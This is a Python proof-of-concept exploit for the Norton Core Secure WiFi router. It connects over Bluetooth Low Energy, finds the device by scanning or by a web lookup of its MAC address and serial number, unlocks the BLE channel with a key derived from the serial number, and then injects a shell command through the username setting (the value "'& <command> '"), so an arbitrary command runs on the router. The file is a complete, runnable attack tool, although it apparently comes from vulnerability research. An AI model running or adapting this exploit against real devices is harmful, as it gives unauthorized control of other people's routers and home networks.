#!/usr/bin/env python3
"""PoC for exploiting Norton Core Secure.

This module contain class for communicating with Norton Core Secure WiFi Router through Bluetooth
Low Energy (BLE).

Also this module is main.

Example of run:
    $ ./ble_norton_core.py reboot

"""

import argparse
import functools
import sys

from bluepy import btle

from proto import Protocol
from web import WebInfo

USER_COMMAND_UUID = btle.UUID("6ACD7570-7341-4793-AA4C-E0F71C0E2A02")
COMMAND_RESPONSE_UUID = btle.UUID("6ACD7570-7341-4793-AA4C-E0F71C0E2A03")
STATUS_NOTIFICATION_UUID = btle.UUID("6ACD7570-7341-4793-AA4C-E0F71C0E2A04")
PROTOCOL_VERSION_UUID = btle.UUID("6ACD7570-7341-4793-AA4C-E0F71C0E2A05")


def connection_required(func):
    """Raise an exception before calling the actual function if the device is not connected."""
    @functools.wraps(func)
    def wrapper(self, *args, **kwargs):
        """Wrapper for raise exception."""
        if self.connection is None:
            raise Exception("Not connected")
        return func(self, *args, **kwargs)

    return wrapper


class BLE:
    """Class to interface with Norton Core Router by BLE."""

    def __init__(self, bt_mac, serial_number):
        """
        :param bt_mac: Device MAC address as a string.
        :param serial_number: Device Serial Number for encryption.
        """

        self._bt_mac = bt_mac
        self._serial_number = serial_number

        self.connection = None
        self._iv = None
        self._is_unlocked = False
        self._ack = None

    def connect(self, bt_adapter_nr=0):
        """Connect to device.

        :bt_adapter_nr: Bluetooth adapter index. Default: 0 for hci0.
        :return: True if connection succeed, False otherwise.

        """
        print("[+] Connecting to Norton Core by BLE... This may take a few minutes.")

        try:
            connection = btle.Peripheral(self._bt_mac, iface=bt_adapter_nr)
            self.connection = connection.withDelegate(self)
            print("[+] Successful connected to Norton Core.")
        except (ValueError, btle.BTLEException) as err:
            print("[-] Connection failed: {}".format(err))
            found_mac = self._search_rover()
            if found_mac and self.connection is None:
                self._bt_mac = found_mac
                self.connect()
            else:
                print("Please reboot router for access to it by BLE " +
                      "and/or check Bluetooth and WAN cable connection.")
                sys.exit(2)

    def disconnect(self):
        """Disconnect from device."""
        try:
            self.connection.disconnect()
        except btle.BTLEException:
            pass

        self.connection = None

    def is_connected(self):
        """Check connection to router.

        :return: True if connected.

        """

        return self.connection is not None

    def test_connection(self):
        """Test if the connection is still alive.

        :return: True if connected.

        """
        if not self.is_connected():
            return False

        # send query for reading version of protocol
        try:
            self.get_protocol_version()
        except btle.BTLEException:
            self.disconnect()
            return False
        except BrokenPipeError:
            # bluepy-helper died
            self.connection = None
            return False

        return True

    @staticmethod
    def _search_rover():
        """Function for searching Norton Core by name.

        :return: Found BT MAC address if searching succeed, None otherwise.

        """
        print("[+] Start searching Norton Core manual...")
        scanner = btle.Scanner()
        try:
            devices = scanner.scan()
        except btle.BTLEException as err:
            print("Failed scan: {}. Check Bluetooth connection.".format(err))
            sys.exit(2)

        for dev in devices:
            for (_, _, value) in dev.getScanData():
                if "Rover" in value:
                    print("[+] Norton Core found: {} ({}).".format(value, dev.addr))
                    return dev.addr
        return None

    def _write_characteristic_and_wait(self, msg):
        """Write characteristic and wait for handling response.

        :param msg: Message for writing.

        """
        print("Waiting response...", end='', flush=True)
        self._send_characteristic.write(msg, True)
        count = 0
        while True:
            if self.connection.waitForNotifications(1.0):
                print('\n', end='', flush=True)
                break
            print(".", end='', flush=True)
            count += 1
            if count == 10:
                print("\nError of receiving response, please try again or reboot router.")
                self.disconnect()
                sys.exit(2)

    @connection_required
    def unlock_router(self):
        """Unlock BLE channel for communication.

        :return: True if router was unlocked, False otherwise.

        """
        if not self._iv:
            self.get_iv()
        print("[+] Start unlocking router...")
        msg = Protocol.encode_request_unlock(self._serial_number, self._iv)

        self._write_characteristic_and_wait(msg)
        return self._is_unlocked

    @connection_required
    def get_iv(self, protocol_version='1.0'):
        """Retrieve IV for encryption.

        :param protocol_version: Protocol version of BLE communication.
        Default: '1.0'.

        """
        print("[+] Start getting IV...")
        msg = Protocol.encode_request_iv(protocol_version)

        self._write_characteristic_and_wait(msg)
        return self._iv

    @connection_required
    def set_setting(self, setting_type=0, value=b''):
        """Set the setting value by type.

        :param setting_type: Setting type, see paper for details.
            Default: 0 for username setting.
        :param value: Value of the setting. Default: empty bytearray.
        """
        if not self._is_unlocked:
            if not self.unlock_router():
                print("Check device serial number and try again.")
                sys.exit(2)
        print("[+] Sending setting...")
        msg = Protocol.encode_set_setting(setting_type, value, self._serial_number, self._iv)
        while msg:
            sub_msg = msg[0:18]
            self._write_characteristic_and_wait(sub_msg)
            print("{} bytes sent".format(self._ack))
            msg = msg[18:]

    @connection_required
    def get_protocol_version(self):
        """
        :return: Version of BLE protocol.
        """
        print("[+] Start getting protocol version...")
        buffer = self._protocol_version_characteristic.read()
        buffer = buffer.replace(b'\x00', b'')
        return buffer.decode('ascii')

    @connection_required
    def get_status_device(self):
        """
        :return: Status of device, see paper for details.
        """
        print("[+] Start getting status of device...")
        buffer = self._status_device_characteristic.read()
        # TODO add parsing status
        return buffer

    @property
    def _protocol_version_characteristic(self):
        """Get BLE characteristic for reading protocol version."""
        characteristics = self.connection.getCharacteristics(uuid=PROTOCOL_VERSION_UUID)
        if not characteristics:
            return None
        return characteristics[0]

    @property
    def _recv_characteristic(self):
        """Get BLE characteristic for receiving data."""
        characteristics = self.connection.getCharacteristics(uuid=COMMAND_RESPONSE_UUID)
        if not characteristics:
            return None
        return characteristics[0]

    @property
    def _send_characteristic(self):
        """Get BLE characteristic for sending commands."""
        characteristics = self.connection.getCharacteristics(uuid=USER_COMMAND_UUID)
        if not characteristics:
            return None
        return characteristics[0]

    @property
    def _status_device_characteristic(self):
        """Get BLE characteristic for status of device."""
        characteristics = self.connection.getCharacteristics(uuid=STATUS_NOTIFICATION_UUID)
        if not characteristics:
            return None
        return characteristics[0]

    def handleNotification(self, _, buffer): # pylint: disable=invalid-name
        """Handle received notifications. See `bluepy` documentation for details."""
        # Getting IV.
        if len(buffer) == 18 and buffer[0] == 0x04 and buffer[1] == 0x10:
            self._iv = Protocol.decode_iv(buffer)
        # Getting status of unlocking.
        elif len(buffer) == 3 and buffer[0] == 0x04:
            self._is_unlocked = True
        # Getting length of sent data.
        elif len(buffer) == 4 and buffer[0] == 0x04:
            self._ack = Protocol.decode_ack(buffer)


def main():
    """Main function."""
    parser = argparse.ArgumentParser(description='PoC for exploitation Norton Core Router BLE.')
    parser.add_argument('-s', "--serial_number", help="Set device serial number manual.")
    parser.add_argument('-m', "--bt_mac", help="Set BT MAC address of device manual.")
    parser.add_argument("command", help="Command for executing on router, for example `reboot`.")
    args = parser.parse_args()

    w_info = WebInfo()
    bt_mac = args.bt_mac or w_info.search_bt_mac()
    serial_number = (args.serial_number or w_info.search_serial_number())[-6:]
    command = "'& {} '".format(args.command)

    ble = BLE(bt_mac, serial_number)
    ble.connect()
    ble.set_setting(0, command)
    print("[+] Command successfully executed!")


if __name__ == "__main__":
    main()
